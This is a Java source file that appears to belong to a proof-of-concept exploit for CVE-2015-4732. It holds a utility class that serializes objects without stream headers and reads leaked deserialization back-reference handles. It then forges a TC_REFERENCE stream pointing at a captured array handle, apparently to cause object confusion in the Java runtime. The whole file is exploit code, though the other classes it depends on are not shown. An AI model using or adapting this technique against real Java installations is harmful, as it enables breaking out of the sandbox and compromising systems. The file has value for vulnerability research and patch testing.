package poc.cve_2015_4732;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamConstants;
import java.io.OutputStream;

public class Utils {
	
	public static byte[] createInitialObjects( ) {
		try {
			ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
			ObjectOutputStream objOut = new NoStreamHeader( byteOut );
			
			objOut.writeObject( new Main[ 1 ] );
			objOut.close( );
			
			return byteOut.toByteArray();
		}
		catch( IOException ioe ) {
			throw new AssertionError( ioe );
		}
	}
	
	public static byte[] createReleaseObject( ) {
		try {
			ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
			ObjectOutputStream objOut = new NoStreamHeader( byteOut );
			
			objOut.writeObject( new Release( ) );
			objOut.close( );
			
			return byteOut.toByteArray();
		}
		catch( IOException ioe ) {
			throw new AssertionError( ioe );
		}
	}
	
	public static byte[] createDefaultReadObject( ) {
		try {
			ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
			ObjectOutputStream objOut = new NoStreamHeader( byteOut );
			
			objOut.writeObject( new DefaultRead( ) );
			objOut.close( );
			
			return byteOut.toByteArray();
		}
		catch( IOException ioe ) {
			throw new AssertionError( ioe );
		}
	}
	
	public static Object[] dumpHandles( OIS ois ) throws IOException {
		Object[] handles = new Object[ 100 ];
		
		
		for( int i = 0; i < handles.length; i++ ) {
			ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
			DataOutputStream dataOut = new DataOutputStream( byteOut );
			
			dataOut.write( ObjectStreamConstants.TC_REFERENCE );
			dataOut.writeInt( ObjectStreamConstants.baseWireHandle + i );
			dataOut.close( );
			
			ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( byteOut.toByteArray( ) ) );
			try {
				handles[ i ] = ois.readObject();
			}
			catch( Throwable t ) { }
		}
		
		return handles;
	}
	
	public static byte[] createARADefaultRead( Object[] handles ) throws IOException {
		int handleIndex = -1;
		for( int i = 0; i < handles.length; i++ ) {
			if( handles[ i ] instanceof Main[] ) {
				handleIndex = i;
				break;
			}
		}
		
		if( handleIndex == -1 ) {
			throw new AssertionError( "Cound not find ARA in handles." );
		}
		
		ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
		DataOutputStream dataOut = new DataOutputStream( byteOut );
		
		dataOut.write( ObjectStreamConstants.TC_REFERENCE );
		dataOut.writeInt( ObjectStreamConstants.baseWireHandle + handleIndex );
		
		return byteOut.toByteArray();
	}
	
	
	private static class NoStreamHeader extends ObjectOutputStream {
		
		public NoStreamHeader( OutputStream os ) throws IOException {
			super( os );
		}
		
		@Override
		public void writeStreamHeader( ) { }
		
	}
}
